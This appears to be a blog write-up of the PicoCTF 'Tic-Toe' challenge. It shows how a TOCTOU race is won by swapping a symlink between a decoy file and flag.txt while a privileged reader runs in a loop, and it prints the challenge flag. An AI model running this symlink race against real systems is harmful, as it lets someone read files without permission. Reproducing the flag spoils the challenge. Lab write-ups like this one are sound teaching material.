---
title: "Tic-Toe from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# Tic-Toe from PicoCTF
[page](https://play.picoctf.org/practice/challenge/380?difficulty=2&page=1&search=tic-tac)
>Description
>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

After i connected i immediately saw `flag.txt` and i tried `cat` on it but it said nuh uh. 
after that i saw `txtreader` and from the `Description` i knew that it read files like this:
```
./txtreader flag.txt
```
But obviously i couldn't read it.
We should use [TOC/TOU attack](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) which uses time of script to run o send another request making it break and allow us to read/execute the file in our instance `flag.txt`. In this we should use [symlink](https://en.wikipedia.org/wiki/Symbolic_link).
First create some file with if you want some text, for me i created `readME` which had `not flag` text in it.Then i proceeded to make double symlink.
```
$ ln -s readME link
$ ./txtreader link
not flag
$ ln -sf flag.txt link
```
This means it works.
```
$ for i in {1..1000};do ln -sf flag.txt link; ln -sf readME link; done 
$ while true; do ln -sf flag.txt link; ln -sf readME link; done &
[1] 2047
```
`for loop` alternates the symbolic link `link` between pointing to `flag.txt` and `readME` a thousand times.
`while loop` does the same but runs in the background and never ends.
So i had to write one last `for loop`:
```
$ for i in {1..1000}; do ./txtreader link; done
```
This `for loop` executed `./txtreader link`, read the `readME` file and also tried to read `flag.txt`. During the trying it caught the moment and from exploit it read the `flag.txt`
***
The flag is:
**picoCTF{ToctoU_!s_3a5y_2075872e}**
